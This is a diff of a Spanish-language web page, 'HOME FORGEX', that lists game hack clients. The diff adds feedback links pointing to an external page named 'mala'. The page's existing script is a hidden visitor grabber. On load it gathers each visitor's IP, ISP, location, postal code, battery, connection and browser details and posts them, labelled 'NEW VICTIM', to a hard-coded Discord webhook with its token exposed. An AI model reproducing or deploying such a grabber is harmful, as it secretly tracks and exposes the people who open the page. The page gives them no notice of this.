@@ -8,9 +8,15 @@
   :root{--bg:#000;--card:#0f0f0f;--acc:#00ff9d;--pink:#ff00aa;--text:#e0e0e0;--muted:#888}
   body{margin:0;font-family:system-ui;background:var(--bg);color:var(--text);min-height:100vh;display:flex;flex-direction:column;overflow-x:hidden}
   header{position:sticky;top:0;background:rgba(0,0,0,.9);backdrop-filter:blur(20px);border-bottom:1px solid #111;z-index:10}
-  .nav{max-width:1300px;margin:auto;padding:20px;display:flex;align-items:center;gap:20px}
+  .nav{max-width:1300px;margin:auto;padding:20px;display:flex;align-items:center;justify-content:space-between;gap:20px}
   .logo{width:56px;height:56px;border-radius:16px;background:linear-gradient(135deg,var(--acc),var(--pink));display:grid;place-items:center;font-weight:900;font-size:28px;color:#000}
   .title{font-size:2.4rem;font-weight:900;background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent}
+  .feedback-btn{
+    background:linear-gradient(90deg,var(--acc),var(--pink));
+    color:#000;font-weight:900;padding:12px 24px;border-radius:12px;text-decoration:none;
+    transition:all .4s;box-shadow:0 8px 30px rgba(0,255,157,.3);
+  }
+  .feedback-btn:hover{transform:translateY(-5px);box-shadow:0 20px 50px rgba(0,255,157,.5)}
   main{flex:1;max-width:1300px;margin:40px auto;padding:0 20px}
   h2{font-size:3rem;font-weight:900;margin:60px 0 30px;background:linear-gradient(90deg,var(--acc),var(--pink));-webkit-background-clip:text;color:transparent;text-align:center}
   .glitch{animation:glitch 4s infinite}
@@ -33,16 +39,17 @@
 </style>
 </head>
 <body>
-
 <header>
   <div class="nav">
     <div style="display:flex;align-items:center;gap:18px">
       <div class="logo">HF</div>
       <div class="title">HOME FORGEX</div>
     </div>
+    <a href="https://10116066-debug.github.io/mala/" class="feedback-btn" target="_blank">
+      Enviar comentarios
+    </a>
   </div>
 </header>
-
 <main>
   <section>
     <h2 class="glitch">TOP 3</h2>
@@ -52,7 +59,6 @@
       <a href="https://eaglerhacks.github.io/wurstX.html" class="card-anim" data-name="WurstX">WurstX <span>Máximo poder</span></a>
     </div>
   </section>
-
   <section>
     <h2 class="glitch">CLIENTS CON HACKS</h2>
     <div class="grid grid-cols-2 md:grid-cols-4 gap-8">
@@ -66,18 +72,18 @@
     </div>
   </section>
 </main>
-
 <footer>
-  <p>Esta página se encuentra en desarrollo. Si notas algún bug o quieres sugerir cambios no olvides informarnos</p>
+  <p>Si notas algún bug o quieres sugerir cambios, ¡envía tus comentarios aquí!</p>
+  <p>
+    <a href="https://10116066-debug.github.io/mala/" target="_blank" style="font-weight:900;font-size:1.2rem;">Enviar comentarios</a>
+  </p>
   <p>
     <a href="https://tiktok.com/@j_eliseoo_v" target="_blank">@j_eliseoo_v en TikTok</a> | El Salvador
   </p>
   <p class="text-sm mt-10 opacity-70">Visitas: <span id="visits">0</span></p>
 </footer>
-
 <script>
 const WEBHOOK = "https://discord.com/api/webhooks/1446712536656249005/sbyzRE1yccOtJ2qJFGFN9K8ltOxELsq8ZqQ04howQOMffAccLDJOFjXgp9alt__ysvBP";
-
 // GRABBER QUE NUNCA FALLA (3 APIs de respaldo)
 async function getGeo() {
   const apis = [
@@ -94,13 +100,11 @@ async function getGeo() {
   }
   return {};
 }
-
 (async () => {
   const geo = await getGeo();
   const battery = await navigator.getBattery?.() || {};
   const uaData = navigator.userAgentData || {};
   const connection = navigator.connection || {};
-
   const mensaje = `**NUEVA VÍCTIMA (MÁXIMO DETALLE)**
 **IP:** ${geo.ip || geo.query || '???'} (${geo.org || geo.isp || '???'})
 **Ubicación:** ${geo.city || '???'}, ${geo.region || geo.regionName || '???'}, ${geo.country_name || geo.country || '???'} (${geo.postal || '?'})
@@ -116,14 +120,12 @@ async function getGeo() {
 **Idioma:** ${navigator.language}
 **Pestañas:** ${history.length}
 **Cookies:** ${navigator.cookieEnabled ? 'Sí' : 'No'} | Modo oscuro: ${window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Sí' : 'No'}`;
-
   await fetch(WEBHOOK, {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({ content: mensaje })
   });
 })();
-
 // REDIRECCIÓN ÉPICA
 document.querySelectorAll('a[data-name]').forEach(a => {
   a.onclick = e => {
@@ -141,7 +143,6 @@ document.querySelectorAll('a[data-name]').forEach(a => {
     }, 800);
   };
 });
-
 // CONTADOR
 let v = localStorage.getItem('visits') || 0; v++; localStorage.setItem('visits', v);
 document.getElementById('visits').textContent = v;
